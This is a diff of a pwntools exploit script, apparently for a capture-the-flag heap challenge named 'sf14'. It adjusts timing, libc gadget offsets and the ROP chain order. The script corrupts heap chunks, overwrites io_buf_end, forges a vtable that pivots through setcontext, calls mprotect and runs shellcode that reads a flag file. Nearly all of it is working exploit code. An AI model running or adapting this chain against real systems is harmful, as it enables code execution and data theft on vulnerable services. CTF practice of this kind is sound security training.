@@ -5,7 +5,7 @@ context(arch = 'amd64', os = 'linux')
 #pie_base = p.libs()['/home/jammin/Desktop/2020-1/sf14/sf14']
 #log.info("PIE base : {}".format(hex(pie_base)))
 
-t = 0.1
+t = 0.05
 # def
 def menu(sel):
 	p.sendlineafter('>> ',str(sel));sleep(t)
@@ -82,16 +82,25 @@ make(p64(heap_base+0x1a0)[:7],str(main_arena_88),[])	# fake chunk c : 0x230
 add('C'*0x8+p64(heap_base+0x1a0))# default[5]   : 0x1a0 in small bin
 delete(str(heap_base+0x230))	 # mixed id = 8 : 0x1a0 in unsorted bin
 add('D'*0x8+p64(io_buf_end-0x10))# default[6]	: 0x1a0's bk = io_buf_end-0x10
+raw_input()
 make('e'*4,6,[])		 # mixed id = 9 : [io_buf_end] = main_arena_88
 
 # setcontext ROP
 ret = libc_base + 0x937
+'''
 pop_rdi = libc_base + 0x21102
 pop_rsi = libc_base + 0x202e8
 pop_rdx = libc_base + 0x1b92
 pop_rax = libc_base + 0x33544
 syscall = libc_base + 0xf727b
-setcontext_53 = libc_base + 0x47b40 + 53
+'''
+pop_rdi = libc_base + 0x0000000000021112
+pop_rsi = libc_base + 0x00000000000202f8
+pop_rdx = libc_base + 0x0000000000001b92
+pop_rax = libc_base + 0x000000000003a738
+syscall = libc_base + 1011605
+#setcontext_53 = libc_base + 0x47b40 + 53
+setcontext_53 = libc_base + 293765
 
 shellcode = ''
 shellcode += shellcraft.pushstr("/home/sf14/flag")
@@ -109,8 +118,8 @@ rop += p64(7)
 rop += p64(pop_rax)
 rop += p64(10)			# sys_mprotect
 rop += p64(syscall)
-rop += p64(0)
 rop += p64(libc_base+0x3c4a18)	# shellcode addr
+rop += p64(0)
 rop += asm(shellcode)
 rop += '\x90'*(0xe0-(len(rop)))
 
@@ -129,6 +138,7 @@ pay += rop
 pay += p64(setcontext_53)*20	# fake vtable overwrited setcontext gadget
 raw_input()
 p.send(pay)
+
 p.interactive()
 
 
